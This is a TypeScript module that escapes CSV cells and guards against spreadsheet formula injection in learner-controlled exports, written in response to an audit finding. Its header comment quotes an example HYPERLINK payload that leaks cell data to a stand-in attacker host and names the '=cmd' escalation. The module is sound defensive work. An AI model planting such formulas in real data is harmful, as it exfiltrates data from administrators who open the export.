/**
 * CSV cell escaping that also neutralises spreadsheet formula injection.
 *
 * Audit finding M1. Eight separate `csvEscape` implementations existed across
 * the backend and web app. All of them quoted correctly — they handled commas,
 * quotes and newlines — and **none** neutralised a leading `=`, `+`, `-`, `@`,
 * tab or carriage return.
 *
 * That matters because the data is learner-controlled and the reader is an
 * administrator. A learner who sets their display name to
 * `=HYPERLINK("https://evil.test?d="&A1,"Click")` gets that evaluated when an
 * admin opens the export in Excel, Google Sheets or LibreOffice. `=cmd|...` is
 * the classic escalation of the same trick. Quoting does not help: the
 * spreadsheet strips the quotes before evaluating the cell.
 *
 * The mitigation is a leading apostrophe, which forces text interpretation and
 * is not itself displayed by the major spreadsheet applications.
 *
 * Mirrored from `@atlas/core/csv/escape`: the web app depends only on
 * `@atlas/contracts` and `@atlas/design-system`, so it cannot import the
 * backend package. Client-side exports carry exactly the same risk — the CSV is
 * built in the browser from the same learner-controlled data. Keep the two in
 * sync; `tests/unit/export/csv-injection.test.ts` asserts both.
 */

/** Characters that make a spreadsheet treat the cell as a formula. */
const FORMULA_PREFIXES = new Set(["=", "+", "-", "@", "\t", "\r"]);

/**
 * A value that is entirely a number is safe and must stay numeric.
 *
 * Without this, every negative number in an export (`-12.5`) would be prefixed
 * and land in the sheet as text, silently breaking totals — trading a real
 * injection risk for a real data-quality bug.
 */
const PLAIN_NUMBER = /^-?\d+(\.\d+)?$/;

/** True when a spreadsheet would evaluate this value as a formula. */
export function needsFormulaGuard(value: string): boolean {
  const first = value.charAt(0);
  if (!FORMULA_PREFIXES.has(first)) return false;
  return !PLAIN_NUMBER.test(value);
}

/**
 * Escape one CSV cell: neutralise formulas, then quote per RFC 4180.
 *
 * The apostrophe goes *inside* the quotes — a guard outside them would be data,
 * not a text marker.
 */
export function csvEscape(value: string | number | null | undefined): string {
  if (value === null || value === undefined) return "";

  const raw = typeof value === "number" ? String(value) : value;
  const guarded = needsFormulaGuard(raw) ? `'${raw}` : raw;

  if (/["\n\r,]/.test(guarded)) {
    return `"${guarded.replaceAll('"', '""')}"`;
  }

  return guarded;
}

/** Join one row of already-raw values into a CSV line. */
export function csvRow(values: ReadonlyArray<string | number | null | undefined>): string {
  return values.map((value) => csvEscape(value)).join(",");
}
